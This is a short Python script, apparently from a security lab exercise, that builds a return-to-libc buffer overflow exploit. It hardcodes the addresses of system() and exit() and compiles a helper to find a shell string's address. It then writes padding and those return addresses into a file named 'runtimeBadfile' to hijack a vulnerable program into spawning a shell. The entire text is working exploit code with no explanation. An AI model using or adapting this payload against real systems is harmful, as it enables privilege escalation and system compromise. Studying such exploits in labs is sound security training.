import commands
import os
def getAppendedValue(shell):
	appendedValue=[]
	for t in range(len(shell),0,-2):
        	appendedValue.append("\\x"+shell[t-2:t])
	appendedValue=''.join(appendedValue)
	return appendedValue	
systemAddress="\x30\xf4\xe5\xb7"
exitAddress="\xb0\x2f\xe5\xb7"
os.system('gcc getShellAddress.c')
shell=commands.getoutput('./a.out')
appendedValue=getAppendedValue(shell)
os.system("""echo `python -c 'print "X"*23 + "\x30\xf4\xe5\xb7"+"%s"+"\x8d\xfe\xff\xbf"'` > runtimeBadfile""" % appendedValue)
